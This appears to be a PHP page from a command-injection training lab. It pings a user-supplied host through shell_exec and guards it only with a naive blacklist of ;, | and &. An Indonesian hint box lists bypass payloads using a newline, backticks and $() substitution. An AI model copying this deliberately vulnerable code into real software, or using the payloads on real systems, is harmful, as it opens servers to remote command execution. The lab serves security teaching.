<?php
$title = 'Lab 3: Command Injection Filter Bypass';
$host = $_GET['host'] ?? '';
$output = '';

// NAIVE FILTER: blocks the classic shell separators ; | & but forgets
// newlines, backticks and $() subshells.
$blacklist = [';', '|', '&'];
$safe_host = str_replace($blacklist, '', $host);

if ($safe_host !== '') {
    $cmd = "ping -c 2 " . $safe_host;
    $output = shell_exec($cmd . ' 2>&1');
}

include 'header.php';
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: input difilter untuk membuang karakter <code>;</code>, <code>|</code>, dan
<code>&amp;</code>. Filter blacklist seperti ini hampir selalu bisa dilewati. Coba (gunakan
newline URL-encoded <code>%0a</code> di address bar, atau kirim langsung lewat Burp Repeater):
</p>
<ul class="hint">
  <li><code>127.0.0.1%0aid</code> (newline sebagai pemisah perintah, tidak ada di blacklist)</li>
  <li><code>127.0.0.1 `id`</code> (command substitution dengan backtick)</li>
  <li><code>127.0.0.1 $(id)</code> (command substitution dengan <code>$()</code>)</li>
</ul>
</details>

<form method="get">
  <label>Host to ping</label><br>
  <input type="text" name="host" value="<?php echo htmlspecialchars($host); ?>">
  <button type="submit">Ping</button>
</form>

<?php if ($output !== ''): ?>
<div class="result-box"><?php echo htmlspecialchars($output); ?></div>
<?php endif; ?>

<?php include 'footer.php'; ?>
